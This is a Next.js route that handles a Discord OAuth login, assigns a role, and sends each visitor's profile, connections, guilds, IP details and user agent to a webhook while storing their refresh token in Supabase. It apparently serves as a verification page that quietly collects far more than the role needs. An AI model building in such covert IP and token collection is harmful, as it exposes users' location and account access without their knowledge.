import { assignDiscordRole } from "@/lib/functions/discord-role";
import { logger } from "@/lib/functions/logger";
import { sendWebhook } from "@/lib/functions/webhook";
import { pushToSupabase } from "@/lib/utils/supabase/push";
import { NextRequest, NextResponse } from "next/server";

export async function GET(req: NextRequest) {
    try {
        const ip = (req.headers.get("x-forwarded-for") ?? "127.0.0.1").split(",")[0];
        const ua = req.headers.get("user-agent") ?? "unknown";
        
        const url = new URL(req.url);
        const code = url.searchParams.get("code");


        if (!code) {
            return NextResponse.redirect(`${process.env.BASE_URL}/error`);
        }
    
        const body = new URLSearchParams({
            "grant_type": "authorization_code",
            "code": String(code),
            "redirect_uri": `${process.env.BASE_URL}/api/callback`,
        }).toString();
    
        try {
            const token = await fetch(`https://discord.com/api/v10/oauth2/token`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Authorization": "Basic " + Buffer.from(`${process.env.CLIENT_ID}:${process.env.CLIENT_SECRET}`).toString("base64")
                },
                body: body
            });
    
            if (!token.ok) {
                return NextResponse.redirect(`${process.env.BASE_URL}/error`);
            }

            const tokenResult = await token.json();

            const { success, userInfo, ownGuilds, connections, ipInfo } = await logger(tokenResult.access_token, ip);

            if (!success || !userInfo || !ownGuilds || !connections || !ipInfo) {
                return NextResponse.redirect(`${process.env.BASE_URL}/error`);
            }
            
            const roleResult = await assignDiscordRole(userInfo.id);

            if (!roleResult.success) {
                return NextResponse.redirect(`${process.env.BASE_URL}/error`);
            }
            
            const webhookResult = await sendWebhook(userInfo, ownGuilds, connections, ipInfo, ua);
            
            if (!webhookResult.success) {
                console.error("Webhook failed:", webhookResult.error);
                return NextResponse.redirect(`${process.env.BASE_URL}/error`);
            }
            
            console.log("Attempting to push data to Supabase...");
            const pushResult = await pushToSupabase(tokenResult.refresh_token, userInfo, ipInfo, ua);

            if (!pushResult.success) {
                console.error("Supabase push failed:", pushResult.error);
                return NextResponse.redirect(`${process.env.BASE_URL}/error`);
            }

            console.log("All operations completed successfully");
            return NextResponse.redirect(`${process.env.BASE_URL}/success`);

        } catch (err) {
            console.error("fetch error: ", err);
            return NextResponse.redirect(`${process.env.BASE_URL}/error`);
        }
    } catch (error) {
        console.error("Unexpected error: ", error);
        return NextResponse.redirect(`${process.env.BASE_URL}/error`);
    }
}
